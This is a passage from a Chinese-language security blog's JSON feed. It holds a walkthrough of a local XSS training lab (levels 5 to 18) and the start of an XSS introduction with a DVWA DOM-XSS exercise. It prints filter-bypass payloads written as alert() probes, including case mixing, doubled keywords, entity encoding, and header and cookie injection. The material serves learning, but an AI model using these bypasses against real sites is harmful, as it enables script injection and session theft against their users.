”</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221018212821722.png\" alt=\"image-20221018212821722\"></p>\n<h2 id=\"XSS黑名单绕过\"><a href=\"#XSS黑名单绕过\" class=\"headerlink\" title=\"XSS黑名单绕过\"></a>XSS黑名单绕过</h2><p>第五关，我们照常理使用标准XSS脚本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;alert()&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>查看源代码看看变成了啥：</p>\n<p><img src=\"image-20221018213520325.png\" alt=\"image-20221018213520325\"></p>\n<p><code>script</code>被替换成了<code>scri_pt</code></p>\n<p>那我们使用事件绕过：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot; onclick=&quot;alert()</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221018213639284.png\" alt=\"image-20221018213639284\"></p>\n<p>发现<code>onclick</code>被替换成了<code>o_nclick</code>，可见，逃逸+事件绕过宣告失败。</p>\n<p>竟然一些特殊的事件被ban，逃逸script标签也不行，那么我们需要考虑一种别的标签，想到超链接标签（<strong>同样可以加入js代码</strong>）</p>\n<p>因此，尝试使用超链接如下：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot;&gt;<span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;javascript:alert()&quot;</span>&gt;</span>a<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/xss_vuln/level5.php?keyword=&quot;&gt;<span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;javascript:alert()&quot;</span>&gt;</span>a<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span>&amp;submit=æç´¢</span><br></pre></td></tr></table></figure>\n<p>成功绕过</p>\n<p><img src=\"image-20221018213917443.png\" alt=\"image-20221018213917443\"></p>\n<h2 id=\"XSS-Href属性绕过\"><a href=\"#XSS-Href属性绕过\" class=\"headerlink\" title=\"XSS Href属性绕过\"></a>XSS Href属性绕过</h2><p>第六关，我们照往常一样，写入XSS代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span>alert()<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>发现和上一题差不多</p>\n<p><img src=\"image-20221018214339051.png\" alt=\"image-20221018214339051\"></p>\n<p>那么，我们直接使用超链接逃逸：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot;&gt;<span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;javascript:alert()&quot;</span>&gt;</span>a<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/xss_vuln/level6.php?keyword=&quot;&gt;<span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;javascript:alert()&quot;</span>&gt;</span>a<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span>&amp;submit=æç´¢</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221018214448698.png\" alt=\"image-20221018214448698\"></p>\n<p>好小子，又过滤了href属性字段。</p>\n<p>但是我们思考一下，前几次看了源码后发现它都是写死在后台代码中。</p>\n<p>那么会不会这一次同样也是将<code>script</code>、<code>onclick</code>、<code>href</code>硬编码在后台代码中做替换呢？</p>\n<p>由于php代码和SQL一样，不区大小写，我们尝试：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot;&gt;<span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">hRef</span>=<span class=\"string\">&quot;javascript:alert()&quot;</span>&gt;</span>a<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/xss_vuln/level6.php?keyword=&quot;&gt;<span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">hRef</span>=<span class=\"string\">&quot;javascript:alert()&quot;</span>&gt;</span>a<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span>&amp;submit=æç´¢</span><br></pre></td></tr></table></figure>\n<p>成功绕过</p>\n<p><img src=\"image-20221018214934374.png\" alt=\"image-20221018214934374\"></p>\n<h2 id=\"XSS双写绕过\"><a href=\"#XSS双写绕过\" class=\"headerlink\" title=\"XSS双写绕过\"></a>XSS双写绕过</h2><p>第7关，照往常，不过我们为了一次性观察想要的过滤信息，可以写成这样：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&gt;&lt;a href=&quot;</span>javascript:<span class=\"title function_ invoke__\">alert</span>()<span class=\"string\">&quot;&gt;onclick script&lt;/a&gt;</span></span><br></pre></td></tr></table></figure>\n<p>我们发现，<code>href</code>、<code>script</code>、<code>on</code>这三个字符统统被吃掉</p>\n<p><img src=\"image-20221018215624834.png\" alt=\"image-20221018215624834\"></p>\n<p>那么我们有理由猜想，后台代码将其直接匹配之后直接替换成空。</p>\n<p>但往往简单的替换都是只匹配一次，我们可以尝试使用双写绕过：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot; oonnclick=&quot;alert()</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221018215915039.png\" alt=\"image-20221018215915039\"></p>\n<h2 id=\"XSS-HTML编码绕过\"><a href=\"#XSS-HTML编码绕过\" class=\"headerlink\" title=\"XSS HTML编码绕过\"></a>XSS HTML编码绕过</h2><p>第8关，输入aaa查看前台源码：</p>\n<p><img src=\"image-20221018221012248.png\" alt=\"image-20221018221012248\"></p>\n<p>那么我们输入一句话探测：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">javascript:alert() onclick ononclick script</span><br></pre></td></tr></table></figure>\n<p>那么我们可以看到，<code>script</code>、<code>onclick</code>、<code>ononclick</code>、<code>sCRipt</code>都被过滤</p>\n<p><img src=\"image-20221018221329565.png\" alt=\"image-20221018221329565\"></p>\n<p>那么我们尝试使用更加细粒度的方法——<strong>HTML编码绕过</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">格式： </span><br><span class=\"line\">字符C -----  &amp;#67;</span><br></pre></td></tr></table></figure>\n<p>其中，67是C的ASCII编码。</p>\n<p>我们使用字符C的HTML编码来绕过对<code>script</code>中字符C的检查：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">javas<span class=\"symbol\">&amp;#67;</span>ript:alert()</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221018221658617.png\" alt=\"image-20221018221658617\"></p>\n<h2 id=\"XSS-特殊场景逻辑绕过\"><a href=\"#XSS-特殊场景逻辑绕过\" class=\"headerlink\" title=\"XSS 特殊场景逻辑绕过\"></a>XSS 特殊场景逻辑绕过</h2><p>第9关，我们照常理<code>aaa</code>输入看源码</p>\n<p><img src=\"image-20221018222234951.png\" alt=\"image-20221018222234951\"></p>\n<p>输入的<code>aaa</code>被替换成了一段文字，链接不合法，那我们输入<code>http://www.baidu.com</code></p>\n<p><img src=\"image-20221018222425416.png\" alt=\"image-20221018222425416\"></p>\n<p>成功控制href属性值，那么我们可以尝试一句话探测：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">javascript:alert();onclick oonnclick http://www.baidu.com</span><br></pre></td></tr></table></figure>\n<p>可以看到，我们的<code>script</code>、<code>onclick</code>、<code>oonnclick</code>均被过滤</p>\n<p><img src=\"image-20221018222603234.png\" alt=\"image-20221018222603234\"></p>\n<p>尝试<strong>HTML编码</strong>，并使用<code>//</code>注释掉后面的正常链接。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">javas<span class=\"symbol\">&amp;#67;</span>ript:alert();//http://www.baidu.com</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221018222900374.png\" alt=\"image-20221018222900374\"></p>\n<h2 id=\"XSS隐藏字段绕过\"><a href=\"#XSS隐藏字段绕过\" class=\"headerlink\" title=\"XSS隐藏字段绕过\"></a>XSS隐藏字段绕过</h2><p>第10关，乍一看，完全没有输入框做交互</p>\n<p><img src=\"image-20221018230848936.png\" alt=\"image-20221018230848936\"></p>\n<p>直接查看前台源码：</p>\n<p><img src=\"image-20221018230921199.png\" alt=\"image-20221018230921199\"></p>\n<p>这三个<code>input</code>框，其type属性全都是<code>hidden</code></p>\n<p>那么，我们全都请求一遍，看看哪个能被我们控制？</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">view-source:http://127.0.0.1/xss_vuln/level10.php?t_link=t_link&amp;t_history=t_history&amp;t_sort=t_sort</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221018231130250.png\" alt=\"image-20221018231130250\"></p>\n<p>我们发现t_sort可以被我们控制，那么就有一句话探测：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">t_sort=<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span>alert() onclick oonnclick href<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221018231258683.png\" alt=\"image-20221018231258683\"></p>\n<p>我们发现过滤了尖括号，那么<code>标签绕过法</code>都没有用了，那我们可以尝试<code>事件法</code>——<code>onclick</code></p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">t_sort=&quot; onclick=&quot;alert()</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/xss_vuln/level10.php?t_sort=&quot; onclick=&quot;alert()</span><br></pre></td></tr></table></figure>\n<p>接着，使用<code>firebug</code>把<code>hidden</code>属性删掉</p>\n<p><img src=\"image-20221018231746353.png\" alt=\"image-20221018231746353\"></p>\n<p>点击显示出来的输入框，触发<code>onclick</code>事件，成功绕过</p>\n<p><img src=\"image-20221018231812669.png\" alt=\"image-20221018231812669\"></p>\n<p>还有一种解法就是，复写type属性</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">t_sort=&quot; onclick=&quot;alert()&quot; type=&quot;abc</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221018232455601.png\" alt=\"image-20221018232455601\"></p>\n<p><img src=\"image-20221018232546685.png\" alt=\"image-20221018232546685\"></p>\n<p>发现可以直接令后面的<code>type=&quot;hidden&quot;</code>失效，也是一种妙招。</p>\n<h2 id=\"HTTP头部XSS\"><a href=\"#HTTP头部XSS\" class=\"headerlink\" title=\"HTTP头部XSS\"></a>HTTP头部XSS</h2><p>来看第11关，查看前台源码：</p>\n<p><img src=\"image-20221018232940761.png\" alt=\"image-20221018232940761\"></p>\n<p>发现和上一关的<code>url</code>有关，我们猜想这应该就是<code>HTTP</code>请求的<code>Referer</code></p>\n<p>打开BP从第10关成功后抓包</p>\n<p><img src=\"image-20221018233046231.png\" alt=\"image-20221018233046231\"></p>\n<p>送入Repeater</p>\n<p><img src=\"image-20221018233250214.png\" alt=\"image-20221018233250214\"></p>\n<p>发现<code>value</code>的值可以被我们通过操纵<code>Referer</code>控制</p>\n<p>那么就有：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot;&lt;script&gt;alert()&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221018233433214.png\" alt=\"image-20221018233433214\"></p>\n<p><strong>尖括号被过滤</strong>，那么我们尝试<code>onclick</code>，并且令后面的隐藏type失效</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot; onclick=&quot;alert()&quot; type=&quot;xxx</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221018233637999.png\" alt=\"image-20221018233637999\"></p>\n<p>成功绕过</p>\n<p><img src=\"image-20221018233745758.png\" alt=\"image-20221018233745758\"></p>\n<p>同样地，来到第12关，查看源码：</p>\n<p><img src=\"image-20221018234102814.png\" alt=\"image-20221018234102814\"></p>\n<p>抓包看看是哪个字段：</p>\n<p><img src=\"image-20221018234021464.png\" alt=\"image-20221018234021464\"></p>\n<p>同样原理，构造onclick事件：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot; onclick=&quot;alert()&quot; type=&quot;xxx</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221018234212386.png\" alt=\"image-20221018234212386\"></p>\n<p>来到第13关，查看源码：</p>\n<p><img src=\"image-20221018234330771.png\" alt=\"image-20221018234330771\"></p>\n<p>多了个t_cook字段，那么我们请求之：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/xss_vuln/level13.php?t_cook=t_cook</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221018234524828.png\" alt=\"image-20221018234524828\"></p>\n<p>抓包，送入<code>repeater</code>，发现通过修改<code>Cookie</code>的<code>user=xxx</code>内容就可以控制<code>value</code>字段</p>\n<p><img src=\"image-20221018234626124.png\" alt=\"image-20221018234626124\"></p>\n<p>那么就有：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot; onclick=&quot;alert()&quot; type=&quot;xxx</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221018234810825.png\" alt=\"image-20221018234810825\"></p>\n<h2 id=\"AngularJS绕过\"><a href=\"#AngularJS绕过\" class=\"headerlink\" title=\"AngularJS绕过\"></a>AngularJS绕过</h2><p>第15关，查看源码：</p>\n<p><img src=\"image-20221018235801293.png\" alt=\"image-20221018235801293\"></p>\n<p>发现头部加载了一个<code>angular.min.js</code>，之后使用了<code>ng-include</code>来导入了子节点</p>\n<p><img src=\"image-20221019000014552.png\" alt=\"image-20221019000014552\"></p>\n<p><strong>ng-include</strong> 指令用于包含外部的 HTML 文件。</p>\n<p>包含的内容将作为指定元素的子节点。</p>\n<p><code>ng-include</code> 属性的值可以是一个表达式，返回一个文件名。</p>\n<p>默认情况下，包含的文件需要包含在同一个域名下。</p>\n<p><code>注意</code>：需要使用<code>单引号</code>包裹你想要导入的<code>文件</code>+<code>参数</code></p>\n<p>如何使用呢？如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/xss_vuln/level15.php?src=1.gif</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221019000219191.png\" alt=\"image-20221019000219191\"></p>\n<p>那么我们思考，这个页面可以包含另一个页面进来，我们何不考虑把第一题的页面导入进来，然后给它构造参数XSS</p>\n<p>这里尝试过单纯地使用script标签没用，所以尝试一种新的事件——<code>img</code>标签配合<code>onerror</code>事件</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/xss_vuln/level15.php?src=&#x27;level1.php?name=<span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">1</span> <span class=\"attr\">onerror</span>=<span class=\"string\">&quot;alert()&quot;</span>&gt;</span>&#x27;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221019000838111.png\" alt=\"image-20221019000838111\"></p>\n<h2 id=\"利用HTML语法特性绕过\"><a href=\"#利用HTML语法特性绕过\" class=\"headerlink\" title=\"利用HTML语法特性绕过\"></a>利用HTML语法特性绕过</h2><p>第16关，我们尝试输入一句话探测</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;alert() href img onclick onerror oonn&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221019001400458.png\" alt=\"image-20221019001400458\"></p>\n<p>发现只有<code>script</code>标签被过滤</p>\n<p>查看源码发现是被替换成<code>&amp;nbsp;</code>空格</p>\n<p><img src=\"image-20221019001457527.png\" alt=\"image-20221019001457527\"></p>\n<p>但是我们还发现，除了替换标签中的<code>script</code>之外，还把我们输入中的<code>空格</code>全都替换成了<code>HTML编码的空格</code>。</p>\n<p>我们不想让标签语句中的空格被替换，那由于HTML语法特性，它只<code>匹配前后</code>的两个<code>尖括号</code>，<strong>中间的语句之间“隔好几个空格”或者“换行”都无所谓</strong>。</p>\n<p>通过上述实验发现img没有过滤，可以用来做标签，那么把语句中的<code>空格</code>全部替换为<code>%0a换行</code>或<code>%0d换行</code>:</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;img%0asrc=1%0aonerror=&quot;alert()&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221019002059825.png\" alt=\"image-20221019002059825\"></p>\n<h2 id=\"可控变量绕过\"><a href=\"#可控变量绕过\" class=\"headerlink\" title=\"可控变量绕过\"></a>可控变量绕过</h2><p>第17关，发现a和b是疑似可控的</p>\n<p><img src=\"image-20221019002528450.png\" alt=\"image-20221019002528450\"></p>\n<p>变换其值：</p>\n<p><img src=\"image-20221019002612767.png\" alt=\"image-20221019002612767\"></p>\n<p>那么，我们就可以构造事件，这回换一个使用<code>onmouseover</code>事件(鼠标移动到其上面就触发)</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/xss_vuln/level17.php?arg01=aa&amp;arg02=bbb onmouseover=alert()</span><br></pre></td></tr></table></figure>\n<p>成功绕过</p>\n<p><img src=\"image-20221019002755768.png\" alt=\"image-20221019002755768\"></p>\n<p>第18关与其同理，不做演示。</p>\n",
            "tags": [
                "XSS跨站脚本攻击探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/05/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E6%8E%A2%E7%A9%B6/XSS%E4%BB%8B%E7%BB%8D/",
            "url": "https://kiyomijin.github.io/2022/10/05/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E6%8E%A2%E7%A9%B6/XSS%E4%BB%8B%E7%BB%8D/",
            "title": "XSS介绍",
            "date_published": "2022-10-04T16:56:24.000Z",
            "content_html": "<h1 id=\"XSS跨站脚本介绍\"><a href=\"#XSS跨站脚本介绍\" class=\"headerlink\" title=\"XSS跨站脚本介绍\"></a>XSS跨站脚本介绍</h1><p>跨站脚本攻击（Cross Site Scripting）是指攻击者利用网站程序对<strong>用户输入过滤不足</strong>，输入可以显示在页面上对其他用户（普通用户、第三方用户、网站拥有者）造成影响的<code>HTML+Js</code>代码，从而<strong>盗取用户资料</strong>、<strong>利用用户身份进行某种动作</strong>或者<strong>对访问者进行病毒侵害</strong>的一种攻击方式。</p>\n<p>为了与层叠样式表（Cascading Style Sheets）的缩写CSS区分开，跨站脚本攻击通常简写为<code>XSS</code>。</p>\n<p><img src=\"image-20221004202321913.png\" alt=\"image-20221004202321913\"></p>\n<h2 id=\"反射型XSS\"><a href=\"#反射型XSS\" class=\"headerlink\" title=\"反射型XSS\"></a>反射型XSS</h2><p>发射型就是将应用程序的运行结果或错误返回到页面上显示。典型的反射型XSS是在搜索框里体现。</p>\n<h2 id=\"存储型XSS\"><a href=\"#存储型XSS\" class=\"headerlink\" title=\"存储型XSS\"></a>存储型XSS</h2><p>存储在服务器、数据库（后台）上，能稳定持久执行的跨站脚本。</p>\n<h2 id=\"DOM型XSS\"><a href=\"#DOM型XSS\" class=\"headerlink\" title=\"DOM型XSS\"></a>DOM型XSS</h2><p>能够构成HTML的DOM树的一部分，或者能够影响DOM结构的跨站脚本。</p>\n<h1 id=\"XSS攻击方式与样例\"><a href=\"#XSS攻击方式与样例\" class=\"headerlink\" title=\"XSS攻击方式与样例\"></a>XSS攻击方式与样例</h1><h2 id=\"XSS盗用用户信息\"><a href=\"#XSS盗用用户信息\" class=\"headerlink\" title=\"XSS盗用用户信息\"></a>XSS盗用用户信息</h2><h2 id=\"XSS盗取Cookie\"><a href=\"#XSS盗取Cookie\" class=\"headerlink\" title=\"XSS盗取Cookie\"></a>XSS盗取Cookie</h2><h2 id=\"XSS钓鱼攻击\"><a href=\"#XSS钓鱼攻击\" class=\"headerlink\" title=\"XSS钓鱼攻击\"></a>XSS钓鱼攻击</h2><p>链接上含有攻击代码</p>\n<h2 id=\"XSS蠕虫攻击\"><a href=\"#XSS蠕虫攻击\" class=\"headerlink\" title=\"XSS蠕虫攻击\"></a>XSS蠕虫攻击</h2><p>XSS蠕虫的破坏力和影响力都是巨大的。XSS蠕虫主要发生在用户之间存在交互行为的页面中，当Web引用程序对用户输入的数据信息没有做严格的过滤时，通过结合用户的登录状态、API调用、<code>Ajax的异步提交</code>，就可以实现在植入恶意代码的同时，将恶意代码进行对外发送，即实现了代码的感染和传播，也就形成了XSS蠕虫。</p>\n<p>MySpace的Samy XSS蠕虫攻击事件是出现最早、最出名的XSS蠕虫攻击事件。</p>\n<h1 id=\"通过实验深入了解XSS三个分类\"><a href=\"#通过实验深入了解XSS三个分类\" class=\"headerlink\" title=\"通过实验深入了解XSS三个分类\"></a>通过实验深入了解XSS三个分类</h1><p>首先我们安装DVWA，使用账号：admin，密码：password进行登录</p>\n<p><code>注意</code>：如果登录不上去，就访问<code>127.0.0.1/dvwa/setup.php</code>，点击最下方的<code>Create/Reset</code>按钮</p>\n<p><img src=\"image-20221004210441095.png\" alt=\"image-20221004210441095\"></p>\n<p>设置DVWA Security【从最低难度low开始吧】，点击<code>submit</code>等待刷新设置完成</p>\n<p><img src=\"image-20221004210537809.png\" alt=\"image-20221004210537809\"></p>\n<h2 id=\"DOM型XSS-1\"><a href=\"#DOM型XSS-1\" class=\"headerlink\" title=\"DOM型XSS\"></a>DOM型XSS</h2><p><img src=\"image-20221004210944194.png\" alt=\"image-20221004210944194\"></p>\n<p>首先我们看到下拉框，就要想一想，这个下拉框是从哪里来的。</p>\n<p>我们可以F12刷新，看一下XHR请求【Ajax】</p>\n<p>这里讲一下<code>XHR</code>和<code>AJax</code>的关系</p>\n<ul>\n<li><code>XMLHttpRequest</code> （简称<code>XHR</code>）对象用于和服务器交换数据，是基于<code>XML</code>的<code>HTTP</code>请求。</li>\n<li><code>XMLHttpRequest</code>是一个浏览器接口，使得<code>Javascript</code>可以进行<code>HTTP(S)</code>通信。</li>\n<li>自从浏览器提供有了<code>XMLHTTPRequest</code>这个接口之后，Ajax操作就此诞生。</li>\n<li>我们再来说说什么是<code>Ajax</code>，<code>Ajax</code> 即 <code>Asynchronous JavaScript and XML</code>，翻译为：<code>异步</code>的 <code>JavaScript</code>和<code>XML</code>。【<strong>重点！！</strong>】</li>\n<li><code>Ajax</code>就是基于浏览器提供的<code>XMLHttpRequest</code>对象来实现的。【<strong>重点！！</strong>】</li>\n</ul>\n<p>传统的网页（不使用 Ajax）如果需要更新内容，必需重载整个网页面。</p>\n<p>自从有了Ajax之后，我们就可以实现<strong>异步地加载网页</strong>。</p>\n<p>什么叫异步？</p>\n<p>异步，异嘛，不同的意思，这里也就是指<code>不跟</code>浏览器加载执行网页代码的<code>步伐</code>一致，也就是说在一个网页中<code>需要用户操作来触发执行代码</code>，而不是整个网页代码<code>一次性执行完毕</code>(这里的用户操作是指在同一个网页下面请求代码执行渲染，而不是让浏览器直接跳转渲染另一个页面)。</p>\n<p>Ajax指的是异步 JavaScript 和 XML（Asynchronous JavaScript and XML）。所以，XMLHttpRequest 对象如果要用于 Ajax 的话，其 open() 方法的 async 参数必须设置为 true。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">xmlhttp.<span class=\"title function_ invoke__\">open</span>(<span class=\"string\">&quot;GET&quot;</span>,<span class=\"string\">&quot;ajax_test.html&quot;</span>,<span class=\"literal\">true</span>);</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221004211458850.png\" alt=\"image-20221004211458850\"></p>\n<p>所以表明，这个页面<strong>没有单独去请求一个功能链接</strong>来返回下拉链表内容。</p>\n<p>因此，我们直接去看源代码，鼠标右键，查看源代码【XSS攻击是基于前台源码的攻击】。</p>\n<p>搜索关键字符：</p>\n<p><img src=\"image-20221004213743525.png\" alt=\"image-20221004213743525\"></p>\n<p>对于HTML的标签基本定义如下</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span> 标签定义 HTML 文档中的一个分隔区块或者一个区域部分。</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span>标签常用于组合块级元素，以便通过 CSS 来对这些元素进行格式化。</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span> 标签用于定义一个段落。 段落和段落之间有空隙。</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span>&gt;</span> 标签用于创建供用户输入的 HTML 表单。表单用于向服务端发送数据。</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span>&gt;</span> 元素包含一个或多个如下的表单元素：</span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">input</span>&gt;</span> 有输入框</span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">textarea</span>&gt;</span>  标签定义多行的文本输入控件</span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">button</span>&gt;</span> 提交按钮</span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">select</span>&gt;</span> 有下拉菜单属性</span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">option</span>&gt;</span> 单选框</span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">optgroup</span>&gt;</span> 复选框</span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">fieldset</span>&gt;</span> 标签将表单内容的一部分打包，生成一组相关表单的字段。</span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">label</span>&gt;</span> 标签为 input 元素定义标注（标记）。</span><br></pre></td></tr></table></figure>\n<p>其中，源码中显示这个form标签里面嵌有一段script标签引起的JavaScript代码</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-handlebars\"><span class=\"language-xml\"></span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">    if (document.location.href.indexOf(&quot;default=&quot;) &gt;= 0) &#123;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">        var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8);</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">        document.write(&quot;<span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">&#x27;&quot; + lang + &quot;&#x27;</span>&gt;</span>&quot; + (lang) + &quot;<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span>&quot;);</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">        document.write(&quot;<span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">&#x27;&#x27;</span> <span class=\"attr\">disabled</span>=<span class=\"string\">&#x27;disabled&#x27;</span>&gt;</span>----<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span>&quot;);</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">    &#125;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\"></span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">    document.write(&quot;<span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">&#x27;English&#x27;</span>&gt;</span>English<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span>&quot;);</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">    document.write(&quot;<span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">&#x27;French&#x27;</span>&gt;</span>French<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span>&quot;);</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">    document.write(&quot;<span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">&#x27;Spanish&#x27;</span>&gt;</span>Spanish<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span>&quot;);</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">    document.write(&quot;<span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">&#x27;German&#x27;</span>&gt;</span>German<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span>&quot;);</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\"></span></span><span class=\"tag\">&lt;/<span 